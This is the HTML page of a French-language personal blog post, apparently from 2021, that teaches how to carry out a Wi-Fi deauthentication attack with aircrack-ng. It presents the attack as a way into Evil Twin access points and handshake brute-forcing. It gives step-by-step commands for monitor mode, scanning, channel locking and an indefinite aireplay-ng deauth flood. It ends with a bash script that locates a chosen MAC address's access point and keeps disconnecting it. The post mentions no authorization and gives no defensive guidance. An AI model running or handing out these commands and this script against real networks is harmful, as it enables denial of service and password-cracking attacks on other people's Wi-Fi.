@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="fr">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Attaque de désauthentification - Nyxott&#39;s blog</title><meta name="Description" content="Effectuer une attaque de désauthentification Wi-Fi"><meta property="og:title" content="Attaque de désauthentification" />
+<meta property="og:description" content="Effectuer une attaque de désauthentification Wi-Fi" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nyxott.github.io/posts/attaque-desauthentification/" />
+<meta property="og:image" content="https://nyxott.github.io/posts/attaque-desauthentification/featured-image.png"/>
+<meta property="article:published_time" content="2021-01-01T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-01-01T00:00:00+00:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://nyxott.github.io/posts/attaque-desauthentification/featured-image.png"/>
+<meta name="twitter:title" content="Attaque de désauthentification"/>
+<meta name="twitter:description" content="Effectuer une attaque de désauthentification Wi-Fi"/>
+<meta name="application-name" content="Nyxott&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Nyxott&#39;s blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://nyxott.github.io/posts/attaque-desauthentification/" /><link rel="prev" href="https://nyxott.github.io/posts/hugo/" /><link rel="next" href="https://nyxott.github.io/posts/veracrypt/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Attaque de désauthentification",
+        "inLanguage": "fr",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/nyxott.github.io\/posts\/attaque-desauthentification\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/nyxott.github.io\/posts\/attaque-desauthentification\/featured-image.png",
+                            "width":  979 ,
+                            "height":  518 
+                        }],"genre": "posts","keywords": "Wi-Fi","wordcount":  943 ,
+        "url": "https:\/\/nyxott.github.io\/posts\/attaque-desauthentification\/","datePublished": "2021-01-01T00:00:00+00:00","dateModified": "2021-01-01T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": "Nyxott"},"author": {
+                "@type": "Person",
+                "name": "Nyxott"
+            },"description": "Effectuer une attaque de désauthentification Wi-Fi"
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Nyxott&#39;s blog"><span class="header-title-pre"><i class='fas fa-dollar-sign'></i></span><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"><i class='fas fa-file-alt'></i> Posts </a><a class="menu-item" href="/categories/"><i class='fa fa-folder-open'></i> Categories </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Nyxott&#39;s blog"><span class="header-title-pre"><i class='fas fa-dollar-sign'></i></span><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title=""><i class='fas fa-file-alt'></i>Posts</a><a class="menu-item" href="/categories/" title=""><i class='fa fa-folder-open'></i>Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Attaque de désauthentification</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Nyxott</a></span>&nbsp;<span class="post-category">included in <a href="/categories/wi-fi/"><i class="far fa-folder fa-fw"></i>Wi-Fi</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="01-01-2021">01-01-2021</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;943 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/attaque-desauthentification/featured-image.png"
+        data-srcset="/posts/attaque-desauthentification/featured-image.png, /posts/attaque-desauthentification/featured-image.png 1.5x, /posts/attaque-desauthentification/featured-image.png 2x"
+        data-sizes="auto"
+        alt="/posts/attaque-desauthentification/featured-image.png"
+        title="Effectuer une attaque de désauthentification Wi-Fi" /></div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#installation-des-outils">Installation des outils</a></li>
+    <li><a href="#attaque">Attaque</a>
+      <ul>
+        <li><a href="#mode-moniteur">Mode moniteur</a></li>
+        <li><a href="#capture-du-trafic">Capture du trafic</a></li>
+        <li><a href="#alignement-du-canal">Alignement du canal</a></li>
+        <li><a href="#désauthentification">Désauthentification</a></li>
+        <li><a href="#mode-station">Mode station</a></li>
+      </ul>
+    </li>
+    <li><a href="#attaque-automatisée">Attaque automatisée</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Cet article explique comment effectuer une attaque de désauthentification Wi-Fi.</p>
+<h2 id="introduction">Introduction</h2>
+<p>Une attaque de désauthentification Wi-Fi est une forme de déni de service ciblant la communication entre un client et un point d&rsquo;accès Wi-Fi.</p>
+<p>Cette attaque consiste à ce qu&rsquo;un attaquant envoie des demandes de désauthentification à un accès Wi-Fi en se faisant passer pour un de ces clients. Cela a pour effet de déconnecter le client en question du point d&rsquo;accès Wi-Fi.</p>
+<p>Elle est, la plupart du temps, utilisé conjointement avec d&rsquo;autres attaques.</p>
+<p>Ainsi, un attaquant peut mettre en place un point d&rsquo;accès Wi-Fi malveillant dans le cadre d&rsquo;une attaque <code>Evil Twin</code>. Dans ce cas, l&rsquo;attaquant pourra utiliser une attaque de désauthentification afin de déconnecter le client de son point d&rsquo;accès Wi-Fi légitime pour le reconnecter sur le point d&rsquo;accès malveillant.</p>
+<p>Dans un autre contexte, un attaquant tentant de découvrir le mot de passe d&rsquo;un point d&rsquo;accès Wi-Fi peut utiliser cette méthode afin de déconnecter un client et récupérer le 4-Way Handshake pour ensuite effectuer une attaque brute-force.</p>
+<p>Enfin, cette attaque de désauthentification peut tout simplement permettre de connaitre le SSID d&rsquo;un point d&rsquo;accès Wi-Fi caché.</p>
+<h2 id="installation-des-outils">Installation des outils</h2>
+<p>On installe les outils nécessaires :</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span>sudo apt install aircrack-ng
+</code></pre></div><h2 id="attaque">Attaque</h2>
+<h3 id="mode-moniteur">Mode moniteur</h3>
+<p>Tout d&rsquo;abord, il faut passer la carte Wi-Fi en mode moniteur afin de pouvoir écouter le trafic Wi-Fi environnant :</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span>sudo airmon-ng start &lt;INTERFACE&gt;
+</code></pre></div><div class="details admonition note open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-pencil-alt fa-fw"></i>Note<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>Il est possible de trouver l&rsquo;interface Wi-Fi via la commande suivante :</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span>sudo iwconfig
+</code></pre></div></div>
+        </div>
+    </div>
+<h3 id="capture-du-trafic">Capture du trafic</h3>
+<p>Une fois la carte activée en mode moniteur, il est possible d&rsquo;écouter le trafic Wi-Fi environnant grâce à la commande suivante :</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span>sudo airodump-ng &lt;INTERFACE&gt;mon
+</code></pre></div><p>Cette commande permet de récupérer énormément d&rsquo;informations telles que, notamment :</p>
+<ul>
+<li><code>BSSID</code> : L&rsquo;adresse MAC du point d&rsquo;accès ;</li>
+<li><code>PWR</code> : La puissance du signal reçue. Plus le nombre est proche de 100, plus le signal est fort ;</li>
+<li><code>Data</code> : Le nombre de paquets de données capturés. Plus le nombre est élevé plus il y a d&rsquo;activité ;</li>
+<li><code>CH</code> : Le canal sur lequel la communication est effectuée ;</li>
+<li><code>ENC</code> : L&rsquo;algorithme de chiffrement utilisé ;</li>
+<li><code>ESSID</code> : Le nom du point d&rsquo;accès ;</li>
+</ul>
+<p>De plus, elle permet également de récupérer l&rsquo;adresse MAC des clients (STATION) connectés à chaque point d&rsquo;accès détecté.</p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw"></i>Tip<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">A tout moment, il est possible de couper l&rsquo;écoute via un <code>ctrl + c</code>.</div>
+        </div>
+    </div>
+<h3 id="alignement-du-canal">Alignement du canal</h3>
+<p>Une fois le point d&rsquo;accès cible repéré, il est indispensable d&rsquo;aligner la carte Wi-Fi sur le même canal que celui-ci afin de pouvoir correctement communiquer.</p>
+<p>Cela est possible via la commande suivante :</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span>sudo airodump-ng -d &lt;BSSID&gt; -c &lt;CH&gt; wlp2s0mon
+</code></pre></div><div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw"></i>Tip<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Il est possible d&rsquo;effectuer immédiatement un <code>ctrl + c</code> puisque l&rsquo;aligmenent sur le bon canal est instantané.</div>
+        </div>
+    </div>
+<h3 id="désauthentification">Désauthentification</h3>
+<p>Une fois toutes ces étapes effectuées, il est désormais possible d&rsquo;exécuter l&rsquo;attaque via la commande suivante :</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span>sudo aireplay-ng -0 <span class="m">0</span> -a &lt;BSSID&gt; -c &lt;STATION&gt; &lt;INTERFACE&gt;mon
+</code></pre></div><div class="details admonition note open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-pencil-alt fa-fw"></i>Note<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Le <code>0</code> (à ne pas confondre avec le <code>-0</code>) permet d&rsquo;envoyer des trames de désauthentification indéfiniment.
+Il est possible de modifier ce nombre par <code>10</code>, par exemple, si l&rsquo;on souhaite envoyer uniquement dix trames de désauthentification.</div>
+        </div>
+    </div>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw"></i>Tip<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Si l&rsquo;option <code>-c &lt;STATION&gt;</code> n&rsquo;est pas précisée, l&rsquo;ensemble des clients connecté au point d&rsquo;accès seront désauthentifiés.</div>
+        </div>
+    </div>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw"></i>Tip<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Lorsque des trames de désauthentification sont envoyées indéfiniment, il est possible d&rsquo;effectuer un <code>ctrl + c</code> pour y mettre fin.</div>
+        </div>
+    </div>
+<h3 id="mode-station">Mode station</h3>
+<p>Une fois l&rsquo;attaque effectué, il est possible de désactiver le mode moniteur de la carte Wi-Fi via la commande suivante :</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="ln">1</span>sudo airmon-ng stop &lt;INTERFACE&gt;mon
+</code></pre></div><h2 id="attaque-automatisée">Attaque automatisée</h2>
+<p>Répéter toutes ces commandes peut être contraignant notamment si l&rsquo;on connaît déjà l&rsquo;adresse MAC de la cible.</p>
+<p>Partant de ce constat, la création d&rsquo;un script automatisant cette attaque peut s&rsquo;avérer utile.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="ln"> 1</span><span class="cp">#!/bin/bash
+</span><span class="ln"> 2</span><span class="cp"></span>
+<span class="ln"> 3</span><span class="nv">TARGET</span><span class="o">=</span><span class="s2">&#34;&lt;TARGET_MAC_ADDRESS&gt;&#34;</span>
+<span class="ln"> 4</span>
+<span class="ln"> 5</span><span class="nb">echo</span> -e <span class="s2">&#34;\e[97mActivating monitor mode...\e[0m&#34;</span>
+<span class="ln"> 6</span>sudo airmon-ng start wlp2s0 &gt; /dev/null 2&gt;<span class="p">&amp;</span><span class="m">1</span>
+<span class="ln"> 7</span><span class="nb">echo</span> -e <span class="s2">&#34;\e[1;92mOK\e[0m\n&#34;</span>
+<span class="ln"> 8</span>
+<span class="ln"> 9</span><span class="nb">echo</span> -e <span class="s2">&#34;\e[97mCleanning old file...\e[0m&#34;</span>
+<span class="ln">10</span>sudo rm airodump-01.csv &gt; /dev/null 2&gt;<span class="p">&amp;</span><span class="m">1</span>
+<span class="ln">11</span><span class="nb">echo</span> -e <span class="s2">&#34;\e[1;92mOK\e[0m\n&#34;</span>
+<span class="ln">12</span>
+<span class="ln">13</span><span class="nb">echo</span> -e <span class="s2">&#34;\e[97mScanning access points...\e[0m&#34;</span>
+<span class="ln">14</span>sudo airodump-ng -w airodump --output-format csv wlp2s0mon &gt; /dev/null 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">&amp;</span>
+<span class="ln">15</span>sleep <span class="m">20</span>
+<span class="ln">16</span>sudo killall -15 airodump-ng &gt; /dev/null 2&gt;<span class="p">&amp;</span><span class="m">1</span>
+<span class="ln">17</span><span class="nb">echo</span> -e <span class="s2">&#34;\e[1;92mOK\e[0m\n&#34;</span>
+<span class="ln">18</span>
+<span class="ln">19</span><span class="nb">echo</span> -e <span class="s2">&#34;\e[97mSearching target...\e[0m&#34;</span>
+<span class="ln">20</span><span class="nv">AP_TARGET</span><span class="o">=</span><span class="sb">`</span>grep <span class="nv">$TARGET</span> airodump-01.csv <span class="p">|</span> cut -d <span class="s2">&#34;,&#34;</span> -f <span class="m">6</span> <span class="p">|</span> xargs<span class="sb">`</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span><span class="m">1</span>
+<span class="ln">21</span>
+<span class="ln">22</span><span class="k">if</span> <span class="o">[</span> <span class="nv">$AP_TARGET</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+<span class="ln">23</span>	<span class="nb">echo</span> -e <span class="s2">&#34;\e[1;92mOK\e[0m\n&#34;</span>
+<span class="ln">24</span>
+<span class="ln">25</span>	<span class="nb">echo</span> -e <span class="s2">&#34;\e[97mSearching additional information...\e[0m&#34;</span>
+<span class="ln">26</span>	<span class="nv">TEMP</span><span class="o">=</span><span class="sb">`</span>grep <span class="nv">$AP_TARGET</span> airodump-01.csv <span class="p">|</span> head -n 1<span class="sb">`</span>
+<span class="ln">27</span>	<span class="nv">CHANNEL_TARGET</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$TEMP</span> <span class="p">|</span> cut -d <span class="s2">&#34;,&#34;</span> -f <span class="m">4</span> <span class="p">|</span> xargs<span class="sb">`</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span><span class="m">1</span>
+<span class="ln">28</span>	<span class="nv">NAME_AP_TARGET</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$TEMP</span> <span class="p">|</span> cut -d <span class="s2">&#34;,&#34;</span> -f <span class="m">14</span> <span class="p">|</span> xargs<span class="sb">`</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span><span class="m">1</span>
+<span class="ln">29</span>	sudo airodump-ng -d <span class="nv">$AP_TARGET</span> -c <span class="nv">$CHANNEL_TARGET</span> wlp2s0mon &gt; /dev/null 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">&amp;</span>
+<span class="ln">30</span>	sleep <span class="m">1</span>
+<span class="ln">31</span>	sudo killall -15 airodump-ng &gt; /dev/null 2&gt;<span class="p">&amp;</span><span class="m">1</span>
+<span class="ln">32</span>	<span class="nb">echo</span> -e <span class="s2">&#34;\e[1;92mOK\e[0m\n&#34;</span>
+<span class="ln">33</span>
+<span class="ln">34</span>	<span class="nb">echo</span> -e <span class="s2">&#34;\e[1;97m</span><span class="nv">$TARGET</span><span class="s2">\e[0m\e[97m detected on \e[0m\e[1;97m</span><span class="nv">$NAME_AP_TARGET</span><span class="s2">\e[0m\e[97m (\e[0m\e[1;97m</span><span class="nv">$AP_TARGET</span><span class="s2">\e[0m\e[97m)\e[0m\n&#34;</span>
+<span class="ln">35</span>	
+<span class="ln">36</span>	<span class="k">if</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">=</span> <span class="s2">&#34;attack&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+<span class="ln">37</span>		<span class="nb">echo</span> -e <span class="s2">&#34;\e[97mStarting attack...\e[0m&#34;</span>
+<span class="ln">38</span>		sudo aireplay-ng -0 <span class="m">0</span> -a <span class="nv">$AP_TARGET</span> -c <span class="nv">$TARGET</span> wlp2s0mon
+<span class="ln">39</span>		<span class="nb">echo</span> -e <span class="s2">&#34;\e[1;92mOK\e[0m\n&#34;</span>
+<span class="ln">40</span>	<span class="k">fi</span>
+<span class="ln">41</span><span class="k">else</span>
+<span class="ln">42</span>	<span class="nb">echo</span> -e <span class="s2">&#34;\e[1;91mNO\e[0m\n&#34;</span>
+<span class="ln">43</span><span class="k">fi</span>
+<span class="ln">44</span>
+<span class="ln">45</span><span class="nb">echo</span> -e <span class="s2">&#34;\e[97mDeactivating monitor mode...\e[0m&#34;</span>
+<span class="ln">46</span>sudo airmon-ng stop wlp2s0mon &gt; /dev/null 2&gt;<span class="p">&amp;</span><span class="m">1</span>
+<span class="ln">47</span><span class="nb">echo</span> -e <span class="s2">&#34;\e[1;92mOK\e[0m&#34;</span>
+<span class="ln">48</span>
+</code></pre></div><p>Il suffit d&rsquo;indiquer l&rsquo;adresse MAC de la cible et le script se chargera automatiquement de détecter si la cible est connectée à un point d&rsquo;accès Wi-Fi. Si tel est le cas, le script enverra indéfiniment des trames de désauthentification au point d&rsquo;accès Wi-Fi en question afin de désauthentifier la cible.</p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw"></i>Tip<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p><code>./&lt;SCRIPT_NAME&gt;</code> : Permet de savoir si la cible est connectée ou non. Si elle l&rsquo;est, le script indiquera sur quel point d&rsquo;accès elle se trouve sans effectuer d&rsquo;attaque.</p>
+<p><code>./&lt;SCRIPT_NAME&gt; attack</code> : Permet de savoir si la cible est connectée ou non. Si elle l&rsquo;est, le script indiquera sur quel point d&rsquo;accès elle se trouve et effectuera l&rsquo;attaque.</p>
+</div>
+        </div>
+    </div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 01-01-2021</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://nyxott.github.io/posts/attaque-desauthentification/" data-title="Attaque de désauthentification" data-hashtags="Wi-Fi"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://nyxott.github.io/posts/attaque-desauthentification/" data-hashtag="Wi-Fi"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://nyxott.github.io/posts/attaque-desauthentification/"><i class="fab fa-linkedin fa-fw"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://nyxott.github.io/posts/attaque-desauthentification/" data-title="Attaque de désauthentification"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://nyxott.github.io/posts/attaque-desauthentification/"><i class="fab fa-reddit fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/wi-fi/">Wi-Fi</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/hugo/" class="prev" rel="prev" title="Hugo"><i class="fas fa-angle-left fa-fw"></i>Hugo</a>
+            <a href="/posts/veracrypt/" class="next" rel="next" title="VeraCrypt">VeraCrypt<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.80.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Nyxott</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{},"data":{"id-1":"Nyxott's blog","id-2":"Nyxott's blog"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
